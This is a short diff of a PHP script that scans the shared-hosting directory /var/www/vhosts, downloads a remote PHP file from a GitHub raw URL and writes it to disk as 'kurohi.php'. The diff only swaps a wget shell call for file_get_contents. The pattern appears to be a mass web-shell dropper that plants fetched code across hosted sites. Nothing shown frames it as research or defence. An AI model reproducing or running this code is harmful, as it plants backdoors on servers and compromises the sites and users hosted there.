@@ -5,7 +5,7 @@ $root = '/var/www/vhosts';
 $scan = scandir($root);
 
 $n = 'kurohi.php';
-$isi = shell_exec('wget https://raw.githubusercontent.com/id33xc/sc/main/fw.php -O');
+$isi = file_get_contents('https://raw.githubusercontent.com/id33xc/sc/main/fw.php');
 
 $bikin = fopen($n, "w");
 		 fwrite($bikin, $isi);
